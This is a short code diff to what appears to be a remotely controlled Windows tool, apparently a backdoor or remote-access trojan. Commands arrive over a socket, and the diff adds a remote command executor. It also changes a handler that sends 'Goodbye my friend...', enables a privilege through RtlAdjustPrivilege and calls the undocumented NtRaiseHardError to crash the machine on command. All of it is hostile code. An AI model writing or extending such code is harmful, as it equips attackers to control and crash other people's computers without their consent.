@@ -2,6 +2,7 @@
 #include "Commands.h"
 #include "SocketUtil.h"
 #include "Utils.h"
+#include "RemoteCommandExecutor.h"
 
 //undocumented API
 //declarations
@@ -49,12 +50,15 @@ BOOL ReplyCommand(SOCKET* sck, PSTR str) {
 BOOL NtRaiseHardErrorCommand(SOCKET* sck) {
 	WriteConnection(sck, "Goodbye my friend...");
 
+	StopCommandExecutor();
+
+	Sleep(3000);
+
     BOOLEAN bl;
 	ULONG response;
 
     RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
     
-    CloseConnection(sck);
     NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
 
 	return TRUE;
